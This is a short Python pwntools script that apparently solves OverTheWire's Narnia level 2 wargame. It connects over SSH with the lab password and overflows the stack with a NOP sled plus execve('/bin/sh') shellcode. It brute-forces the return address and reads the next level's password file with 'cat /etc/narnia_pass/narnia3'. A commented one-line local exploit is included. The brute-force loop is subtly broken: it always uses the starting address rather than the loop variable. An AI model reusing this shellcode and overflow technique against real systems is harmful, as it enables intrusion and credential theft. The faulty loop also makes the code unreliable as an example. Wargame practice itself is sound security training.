from pwn import *


con = ssh('narnia2', 'narnia.labs.overthewire.org', password='nairiepecu', port=2226)
context.arch = 'i386'
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
offset = 132
start = 0xffff0101
passwd = b'pass: '
old_len = len(passwd)
# Okay, I tried to do brute-force of ret_addr cause exploit only works locally...
'''
local exploit:
./narnia2 $(python -c 'print "\x90" * 104 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xcc\xd7\xff\xff"')
'''
for i in range(start, start + 0x10000, 0x10):
    print(p32(i))
    ret_addr = p32(start)
    payload = b'\x90' * (offset - len(shellcode))
    payload += shellcode
    payload += ret_addr
    p = con.process(['/narnia/narnia2',payload])
    try:
        p.sendline('cat /etc/narnia_pass/narnia3')
        response = p.recvline()
        passwd += response
        if old_len < len(passwd):
            break
    except EOFError:
        pass
    finally:
        p.close()
print(passwd)
